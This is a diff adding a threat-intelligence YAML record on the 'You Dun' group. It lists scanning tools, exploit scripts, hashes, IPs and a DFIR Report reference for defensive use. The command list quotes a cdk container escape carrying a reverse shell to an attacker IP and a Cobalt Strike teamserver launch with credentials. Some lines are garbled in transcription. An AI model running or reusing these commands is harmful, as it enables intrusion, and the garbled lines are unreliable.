@@ -1,0 +1,108 @@
+description: Analysis of an open directory found a Chinese speaking threat actors
+  toolkit and history of activity. The threat actor displayed extensive scanning and
+  exploitation using WebLogicScan, Vulmap, and Xray, targeting organizations in South
+  Korea, China, Thailand, Taiwan, and Iran.
+date: '2024-10-28'
+authors:
+- @pcsc0ut
+- @svch0st
+attribution: Chinese threat actor (You Dun)
+malware_families:
+- LockBit 3
+- Cobalt Strike
+- Viper
+TTPs:
+  processs:
+  - WebLogicScan
+  - Vulmap
+  - Xray
+  - dirsearch
+  - sqlmap
+  - seeyon_exp
+  - weaver
+  - bash
+  - nohup
+  - f8x
+  - curl
+  - docker
+  - git
+  - python3
+  - teamserver
+  - wget
+  - xray
+  commandline:
+  - WebLogicScan <various text files>
+  - vulmap.py <several lists of targets>
+  - Xray <two Chinese websites>
+  - dirsearch <target URLs>
+  - sqlmap <various website URLs>
+  - seeyon_exp <several sites exploiting Zhiyuan OA component>
+  - nohup Cobalt Strike server with password and account details
+  - bash f8x -all
+  - bash f8x -viper
+  - curl -o f8x https://f8x.io
+  - git clone https://github.com/rabbitmask/Weblogicscan.git
+  - cd Weblogicscan/
+  - python3 Weblogicscan.py -h
+  - python3 WeblogicScan.py ~f target.txt
+  - python3 vulmap.py ~f wb.txt -a weblogic -t 20
+  - python3 vulmap.py -f ww.txt -a weblogic -t 20
+  - cd Weblogicscan/.bash_history
+  - python3 vulmap.py -f kk.txt -a weblogic -t 20
+  - git clone https://github.com/zhzyker/vulmap.git
+  - cd vulmap/
+  - python3 vulmap.py -h
+  - python3 vulmap.py -f wb.txt -a weblogic
+  - python3 vulmap.py ~f ww.txt -a weblogic
+  - python3 vulmap.py -f kk.txt -a weblogic
+  - python3 seeyon_exp.py -u https:// .net.cn att
+  - ./xray_linux_amde4
+  - ./xray_linux_amde4 ws listen 127.0.0.1:7777 html-output proxy.html
+  - ./xray_linux_amde4 ws url https ~con/
+  - sqlmap -u "https://"
+  - sqlmap -u "https-"
+  - nohup ./teamserver -host=116.212.120.32 -passw2345 -admin=jhc:Mafiag12:2345 -admin=jhc:Chinese
+    (Simplified)
+  - ./cdk_linux_amd64 run mount-cgroup "sh ~i >6 /dev/tcp/116.212.120.32/1444 081"
+  - ./cdk_linux_amd64 run
+  powershell:
+  - Invoke-EternalBlue.ps1
+  - Invoke-MS16032.ps1
+  - Invoke-MS16135.ps1
+  - ListAllUsers.ps1
+  - ListLogged-inUsers.ps1
+  - RegRdpPort.ps1
+  - SessionGopher.ps1
+  - Recon-AD-SPNs.dll bbee3a7a828af2a936e3e9a2931f2022
+  - Recon-AD-Users.dll fb5fbc7c6b56a7a491532581faef5ee1
+  - ReflectiveDll.x64.dll 5ed0803ea91968c87994280f6432d43c
+  - RegRdpPort.ps1 cdaa0eda10dce813a0def8be3a669825
+  - SessionGopher.ps1 d4969c3a7d88ad38f885a061bba26752
+  scripting_engine: []
+  registry_keys: null
+  network_connections: null
+  file_modifications: null
+  persistence: null
+  pipes: null
+  process_relations: null
+IOCs:
+- hash: b94d9412764529f264433c39b6043d43b96e824d016f40a5a38e26771374171f
+- hash: 56bd833178c08baedb0a6f51c957a0cc8e6f9298
+- hash: 8c4d6f6c6db273d79a7c46b623e515e3
+- IP: 43.228.89.245
+- IP: 43.228.89.246
+- IP: 43.228.89.247
+- IP: 43.228.89.248
+- IP: 103.228.108.247
+- IP: 115.126.107.244
+- IP: 116.212.120.32
+- IP: 163.53.216.157
+- domain: fgfg.bcfnwg.cc
+- URL: hxxps://t.me/You_Dun
+- URL: hxxps://t.me/You_Dun888
+- URL: hxxps://f8x.io/
+- https://github.com/rabbitmask/Weblogicscan.git
+- https://github.com/zhzyker/vulmap.git
+- 116.212.120.32
+reference: https://thedfirreport.com/2024/10/28/inside-the-open-directory-of-the-you-dun-threat-group/
+file_creation_date: May 13, 2025
